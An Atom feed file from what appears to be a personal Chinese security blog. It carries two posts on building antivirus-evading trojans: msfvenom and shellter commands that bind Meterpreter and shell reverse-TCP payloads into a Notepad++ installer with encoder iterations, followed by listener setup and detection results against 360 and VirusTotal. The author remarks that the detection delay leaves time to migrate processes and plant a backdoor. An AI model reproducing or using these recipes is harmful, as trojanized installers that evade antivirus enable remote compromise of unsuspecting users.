@@ -1,0 +1,238 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://www.sycamore.top</id>
+    <title>Sycamore&#39;s Blog • Posts by &#34;shellter&#34; tag</title>
+    <link href="https://www.sycamore.top" />
+    <updated>2022-04-18T12:48:36.000Z</updated>
+    <category term="Python" />
+    <category term="计算机视觉" />
+    <category term="深度学习" />
+    <category term="Crypto" />
+    <category term="Hexo" />
+    <category term="shokaX" />
+    <category term="博客主题" />
+    <category term="实习" />
+    <category term="springboot" />
+    <category term="CTF" />
+    <category term="Misc" />
+    <category term="Web" />
+    <category term="Miec" />
+    <category term="Re" />
+    <category term="Pwn" />
+    <category term="Backdoor" />
+    <category term="Linux" />
+    <category term="Kali" />
+    <category term="Trojan horse" />
+    <category term="Metasploit" />
+    <category term="frp" />
+    <category term="shellter" />
+    <category term="Reverse Shell" />
+    <category term="Develop" />
+    <category term="Electron" />
+    <category term="Google Translate" />
+    <category term="node" />
+    <category term="Hitokoto" />
+    <category term="npm" />
+    <category term="plugs" />
+    <category term="RCE，loophole" />
+    <category term="毕业设计" />
+    <category term="机器学习" />
+    <category term="Diary" />
+    <category term="Australia" />
+    <category term="Mod" />
+    <category term="CP2077" />
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/</id>
+        <title>免杀木马测试</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/"/>
+        <content type="html">&lt;div class=&#34;note default&#34;&gt;
+&lt;p&gt;&lt;strong&gt;测试杀软：360 全家桶&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;msf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; MSF&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;mp_npp:&lt;/strong&gt;（2022/4/16）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &amp;gt; mp_npp.exe&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;监听&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;不能完全通过 &lt;strong&gt;静态扫描&lt;/strong&gt;，快速扫描没事，指定文件夹扫描木马会报毒，且运行时会&lt;strong&gt;第一时间&lt;/strong&gt;检测出木马&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;40 /  70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;mp_rc4_npp_i15：&lt;/strong&gt;（2022/4/18）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 15 -f exe &amp;gt; mp_rc4_npp_i15.exe&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;监听&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/meterpreter/reverse_tcp_rc4&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;能过 &lt;strong&gt;360 静态检测&lt;/strong&gt;，但会被 &lt;strong&gt;动态检测&lt;/strong&gt; 查杀&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;38 /  70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvODQzOTE0OTNkODJhNTg3OGYyYTJlYWE5NDY1ZTk1YjRlYWUwOWJjODQ4NmQ1MTRjYzE5YTc0MWIxOTE4NzIxYg==&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;sh_npp_i27：&lt;/strong&gt;（2022/4/18）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 27 -f exe &amp;gt; sh_npp_i27.exe&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;监听&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/shell_reverse_tcp_rc4&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;能过 &lt;strong&gt;360 静态检测&lt;/strong&gt;，但会被 &lt;strong&gt;动态检测&lt;/strong&gt; 查杀&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;35 /  69&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvMGE5NWQzOTBjODE2NWNmY2UxZGQ0Y2U0MDc2NGUyN2RiZmQ4OWJkMzk2YzZhMmE1OGFlNjYyZTYyM2FhNjIzMz9ub2NhY2hlPTE=&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;shellter-捆绑免杀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellter-捆绑免杀&#34;&gt;#&lt;/a&gt; shellter 捆绑免杀&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;shellter_npp：&lt;/strong&gt;（2022/4/16）
+&lt;ul&gt;
+&lt;li&gt;payload 选择 &lt;strong&gt;shellter 自带&lt;/strong&gt;的：Meterpreter_Reverse_TCP （选项 1）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;能过 &lt;strong&gt;360 静态检测&lt;/strong&gt;，&lt;strong&gt;动态检测&lt;/strong&gt; 报毒会有 &lt;strong&gt;大约一分钟&lt;/strong&gt; 的延迟（时间上足够&lt;strong&gt;迁移进程&lt;/strong&gt; +&lt;strong&gt; 布置后门&lt;/strong&gt;）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;31 /  70&lt;/strong&gt;）&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Trojan horse" />
+        <category term="Metasploit" />
+        <category term="shellter" />
+        <updated>2022-04-18T12:48:36.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</id>
+        <title>免杀捆绑工具 shellter 的安装及使用</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
+        <content type="html">&lt;div class=&#34;note default&#34;&gt;
+&lt;p&gt;&lt;strong&gt;shellter&lt;/strong&gt; 是一个&lt;strong&gt;捆绑&lt;/strong&gt;工具，采用动态 &lt;strong&gt;shellcode&lt;/strong&gt; 注入 的方式，将 &lt;strong&gt;shellcode&lt;/strong&gt; 注入到其它程序中，达到&lt;strong&gt;免杀&lt;/strong&gt;的效果，躲避杀软的查杀。&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;shellter-安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellter-安装&#34;&gt;#&lt;/a&gt; shellter 安装&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;添加 &lt;strong&gt;i386 32 位&lt;/strong&gt; 架构支持、更新 &lt;strong&gt;apt&lt;/strong&gt;、安装 &lt;strong&gt;wine&lt;/strong&gt; 依赖：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dpkg --add-architecture i386 &amp;amp;&amp;amp; apt update &amp;amp;&amp;amp; apt -y install wine32&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;安装 &lt;strong&gt;shellter&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;apt install shellter&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443125/Typera/2023/04/0c4297a033272d1212d9cb86e4daf005.png&#34; alt=&#34;image-20230426011840045&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;shellter-使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellter-使用&#34;&gt;#&lt;/a&gt; shellter 使用&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用 shellter 捆绑 Meterpreter_Reverse_TCP&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;捆绑步骤：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;命令行输入  &lt;code&gt;shellter&lt;/code&gt;  打开工具&lt;/li&gt;
+&lt;li&gt;输入  &lt;code&gt;A&lt;/code&gt;  或者  &lt;code&gt;a&lt;/code&gt; ，选择 &lt;strong&gt;自动模式&lt;/strong&gt;；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PE Target:&lt;/code&gt;  后输入要进行 &lt;strong&gt;捆绑&lt;/strong&gt; 的 &lt;strong&gt;文件路径&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443164/Typera/2023/04/272fa29e9da9d004a3cf25b87079f7de.png&#34; alt=&#34;image-20230426011919683&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;输入 &lt;code&gt;Y&lt;/code&gt; ，进入 &lt;strong&gt;隐形模式&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443168/Typera/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png&#34; alt=&#34;image-20230426011923428&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;输入 &lt;code&gt;L&lt;/code&gt; ，使用 &lt;strong&gt;payload&lt;/strong&gt; 攻击模块列表（即上面的 &lt;strong&gt;1~7&lt;/strong&gt; ）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;payload&lt;/strong&gt; 编号选择  &lt;code&gt;1&lt;/code&gt;  ，使用 Meterpreter_Reverse_TCP 攻击&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443172/Typera/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png&#34; alt=&#34;image-20230426011927372&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;分别输入监听端的 &lt;strong&gt;IP&lt;/strong&gt;、&lt;strong&gt;端口号&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443175/Typera/2023/04/396417290b20f351cc3c1d96669a3c4e.png&#34; alt=&#34;image-20230426011931101&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;按  &lt;code&gt;[Enter]&lt;/code&gt;  退出 &lt;strong&gt;shellter&lt;/strong&gt; ：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443179/Typera/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png&#34; alt=&#34;image-20230426011934700&#34; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;[关于生成的文件]&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;捆绑完毕&lt;/strong&gt;的文件 会代替 &lt;strong&gt;原文件&lt;/strong&gt; ，即出现在 原文件目录 下，&lt;strong&gt;名字相同&lt;/strong&gt;&lt;br /&gt;
+而&lt;strong&gt;原文件&lt;/strong&gt;会 &lt;strong&gt;备份&lt;/strong&gt; 在目录  &lt;code&gt;/root/Shellter_Backups/&lt;/code&gt;  ：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443183/Typera/2023/04/9b58fed5ce217d4b84967579f2522d55.png&#34; alt=&#34;image-20230426011938517&#34; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;利用-免杀效果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-免杀效果&#34;&gt;#&lt;/a&gt; 利用 &amp;amp; 免杀效果&lt;/h2&gt;
+&lt;h3 id=&#34;利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;上传到 &lt;strong&gt;Win7_x64&lt;/strong&gt; 虚拟机，&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kali_Linux&lt;/strong&gt; 虚拟机打开 &lt;strong&gt;msf&lt;/strong&gt; （命令  &lt;code&gt;msfconsole&lt;/code&gt; ），监听&lt;strong&gt;反弹 shell&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;反弹 shell&lt;/strong&gt; 成功！&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443189/Typera/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png&#34; alt=&#34;image-20230426011944783&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;免杀效果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#免杀效果&#34;&gt;#&lt;/a&gt; 免杀效果&lt;/h3&gt;
+&lt;p&gt;我的 &lt;strong&gt;Win7_x64 虚拟机&lt;/strong&gt; 安装了 &lt;strong&gt;360 全家桶&lt;/strong&gt;，&lt;/p&gt;
+&lt;p&gt;但是 &lt;strong&gt;静态检测&lt;/strong&gt; 貌似并没有查出 &lt;strong&gt;木马文件&lt;/strong&gt;～&lt;/p&gt;
+&lt;p&gt;运行木马程序，并成功获得 &lt;strong&gt;meterpreter&lt;/strong&gt; 的 &lt;strong&gt;shell&lt;/strong&gt; 之后，&lt;strong&gt;360&lt;/strong&gt; 竟然也没有第一时间报毒。。。 什么情况 (⊙_⊙)？&lt;/p&gt;
+&lt;p&gt;大概一分钟之后，才提示有木马：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443194/Typera/2023/04/69719cbb27c9df97660f0c6405be89c7.png&#34; alt=&#34;image-20230426011949574&#34; /&gt;&lt;br /&gt;
+（实际上这个时间足够黑客 &lt;strong&gt;迁移进程&lt;/strong&gt; 并 &lt;strong&gt;布置后门&lt;/strong&gt; 了)&lt;/p&gt;
+&lt;p&gt;当然，如果你的电脑以前中过这个毒，&lt;strong&gt;360&lt;/strong&gt; 会第一时间反应过来&lt;br /&gt;
+（但这要是&lt;strong&gt;还没反应&lt;/strong&gt;，&lt;strong&gt;360&lt;/strong&gt; 就该进回收站了）&lt;/p&gt;
+&lt;p&gt;然后看看 &lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;31 / 70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==&#34;&gt;检测报告 传送门 1&lt;/span&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443198/Typera/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png&#34; alt=&#34;image-20230426011954090&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;对比 ：&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+使用 同程序 同&lt;strong&gt; payload&lt;/strong&gt;，用 &lt;strong&gt;msf&lt;/strong&gt; 自带的捆绑手段生成的木马：&lt;br /&gt;
+（命令： &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &amp;gt; mp_npp.exe&lt;/code&gt; ）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;40 /  70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==&#34;&gt;检测报告 传送门 2&lt;/span&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443202/Typera/2023/04/c0631de31f6d8f365c052ec14a014b37.png&#34; alt=&#34;image-20230426011958597&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;相比较而言，可以说 &lt;strong&gt;shellter&lt;/strong&gt; 的捆绑&lt;strong&gt;免杀&lt;/strong&gt;效果比 &lt;strong&gt;msf&lt;/strong&gt; 好很多了。&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Trojan horse" />
+        <category term="Metasploit" />
+        <category term="shellter" />
+        <updated>2022-04-16T10:10:24.000Z</updated>
+    </entry>
+</feed>
